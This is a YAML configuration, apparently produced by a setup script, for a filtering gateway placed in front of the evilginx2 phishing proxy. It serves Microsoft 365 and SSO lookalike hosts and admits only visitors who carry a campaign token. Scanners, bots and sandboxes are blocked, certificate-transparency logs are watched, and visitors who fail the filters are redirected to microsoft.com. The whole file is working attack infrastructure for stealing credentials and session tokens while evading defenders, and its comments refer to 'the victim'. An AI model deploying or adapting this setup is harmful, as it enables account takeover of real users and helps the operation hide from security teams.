# InfraGuard config — fronting evilginx2 (rendered by deploy/setup_infraguard.sh)
# Chain: victim -> InfraGuard :443 (token gate + filters) -> evilginx 127.0.0.1:${EG_PORT} -> origin
# NOTE: upstream hostname = ${SNI_HOST} — /etc/hosts maps it to 127.0.0.1 so the TLS SNI
#       evilginx/certmagic sees matches the wildcard cert (*.${BASE}.${ZONE}).

listeners:
  - protocol: "https"
    bind: "0.0.0.0"
    port: 443
    tls:
      cert: "${IG_TLS_CERT}"
      key: "${IG_TLS_KEY}"
    domains:
      - "${LANDING_FQDN}"
      - "${WWW_FQDN}"
      - "${CDN1_FQDN}"
      - "${CDN2_FQDN}"
      - "${CDN3_FQDN}"
      - "${CDN4_FQDN}"
      - "${SSO_FQDN}"
      - "${M365_FQDN}"
      - "${EVENTS_FQDN}"
  - protocol: "http"
    bind: "0.0.0.0"
    port: 80
    domains:
      - "${LANDING_FQDN}"

domains:
  # LANDING host — campaign token gate ONLY here (assets hosts must stay token-free,
  # otherwise the victim's browser fetches css/js without ?t= and the page breaks).
  "${LANDING_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    campaign_token:
      enabled: true
      token_param: "t"
      tokens:
        - "${CAMPAIGN_TOKEN}"
      score_on_missing: 0.9
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"

  # Assets/redirect hosts — no token (victim browser fetches these from the rendered page),
  # protected by the global pipeline (sandbox/enumeration/bot) instead.
  "${WWW_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${CDN1_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${CDN2_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${CDN3_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${CDN4_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${SSO_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${M365_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"
  "${EVENTS_FQDN}":
    upstream: "https://${SNI_HOST}:${EG_PORT}"
    profile_type: "evilginx"
    drop_action:
      type: "redirect"
      target: "https://www.microsoft.com"

intel:
  auto_block_scanners: true
  dynamic_whitelist_threshold: 3
  banned_ip_file: "${IG_HOME}/data/banned_ips.txt"
  rules_dir: "${IG_HOME}/rules"
  feeds:
    enabled: false
  ct_monitor:
    enabled: true
    interval_hours: 4.0
    monitored_domains:
      - "${LANDING_FQDN}"
  reputation_monitor:
    enabled: false

tracking:
  db_path: "${IG_HOME}/data/tracking.db"

pipeline:
  filter_mode: "scoring"
  block_score_threshold: 0.7
  replay_window_seconds: 86400
  replay_persist: true
  enable_ip_filter: true
  enable_bot_filter: true
  enable_header_filter: true
  enable_geo_filter: false
  enable_dns_filter: false
  enable_profile_filter: false
  enable_replay_filter: false
  enable_enumeration_filter: true
  enable_sandbox_filter: true
  enable_ja3_filter: false

api:
  bind: "127.0.0.1"
  port: 8080
  auth_token: "${IG_API_TOKEN}"
  health_path: "/up"

decoy_pages_dir: "${IG_HOME}/pages"

logging:
  level: "INFO"
  format: "json"
